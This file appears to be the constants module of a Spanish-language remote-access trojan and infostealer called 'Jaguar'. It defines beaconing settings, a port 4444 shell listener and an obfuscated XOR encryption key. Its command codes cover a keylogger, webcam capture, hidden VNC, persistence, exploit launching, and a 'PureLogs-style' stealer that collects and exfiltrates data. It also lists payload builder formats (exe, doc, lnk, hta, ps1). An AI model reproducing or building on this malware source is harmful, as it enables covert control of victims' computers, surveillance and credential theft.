# -*- coding: utf-8 -*-
"""Constantes globales de Jaguar."""

APP_NAME = "Jaguar"
APP_VERSION = "2.0.0"

# Red
HOST_DEFECTO = "0.0.0.0"
PUERTO_DEFECTO = 8000
PUERTO_SHELLS = 4444
TIMEOUT_SOCKET = 30.0
INTERVALO_LATIDO = 10.0
BEACON_SLEEP_DEFECTO = 5.0
BEACON_JITTER_DEFECTO = 20

# Cifrado
TAM_LONGITUD = 4
_K_OBF = bytes([
    0x10, 0x6E, 0x1D, 0x0F, 0x6E, 0x08, 0x77, 0x68, 0x6A, 0x68,
    0x6C, 0x77, 0x39, 0x36, 0x3B, 0x2C, 0x3F, 0x77, 0x39, 0x35,
    0x37, 0x2A, 0x3B, 0x28, 0x2E, 0x33, 0x3E, 0x3B,
])
CLAVE_XOR_DEFECTO = bytes(b ^ 0x5A for b in _K_OBF)

# Tipos de mensaje
MSG_REGISTRO = "registro"
MSG_LATIDO = "latido"
MSG_COMANDO = "comando"
MSG_RESPUESTA = "respuesta"
MSG_EVENTO = "evento"          # <- push (hvnc_frame / escritorio_frame)
MSG_DESCONEXION = "desconexion"
MSG_BEACON_CONFIG = "beacon_config"
MSG_CHUNK = "chunk"

# Categorías de comando
CMD_SYSINFO = "sysinfo"
CMD_PROCESOS = "procesos"
CMD_SHELL = "shell"
CMD_LISTAR_DIR = "listar_dir"
CMD_DESCARGAR = "descargar_archivo"
CMD_SUBIR = "subir_archivo"
CMD_CAPTURA = "captura"
CMD_MENSAJE = "mensaje"
CMD_ABRIR_URL = "abrir_url"
CMD_ENERGIA = "energia"
CMD_PERSISTIR = "persistir"
CMD_DESCONECTAR = "desconectar"
CMD_WEBCAM = "webcam"
CMD_KEYLOGGER = "keylogger"
CMD_HVNC_INICIAR = "hvnc_iniciar"
CMD_HVNC_DETENER = "hvnc_detener"
CMD_HVNC_STREAM = "hvnc_stream"
CMD_CAPTURA_STREAM = "captura_stream"
CMD_RED_ESCANEAR = "red_escanear"
CMD_SUGERIR_EXPLOIT = "sugerir_exploit"
CMD_LANZAR_EXPLOIT = "lanzar_exploit"

# Stealer (estilo PureLogs)
CMD_STEALER_RECOLECTAR = "stealer_recolectar"
CMD_STEALER_ESTADO = "stealer_estado"
CMD_STEALER_PAQUETE = "stealer_paquete"
CMD_STEALER_EXFIL = "stealer_exfil"
CMD_STEALER_AUTO = "stealer_auto"

# Builder
FORMATOS_PAYLOAD = ["py", "exe", "doc", "lnk", "ps1", "vbs", "bat", "hta"]